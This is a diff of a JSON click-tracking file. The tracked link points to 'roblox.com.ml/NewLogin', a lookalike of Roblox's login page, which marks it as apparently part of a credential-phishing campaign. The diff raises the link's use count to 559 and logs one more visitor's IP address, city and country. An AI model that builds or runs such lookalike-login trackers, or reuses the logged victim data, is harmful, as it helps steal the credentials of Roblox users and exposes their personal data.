@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 558,
+    "useCount": 559,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4571,6 +4571,14 @@
       },
       {
         "timestamp": 1777100193112,
+        "ip": "180.150.80.3",
+        "country": "Australia",
+        "city": "Perth",
+        "flag": "🇦🇺",
+        "countryCode": "AU"
+      },
+      {
+        "timestamp": 1777100274696,
         "ip": "180.150.80.3",
         "country": "Australia",
         "city": "Perth",
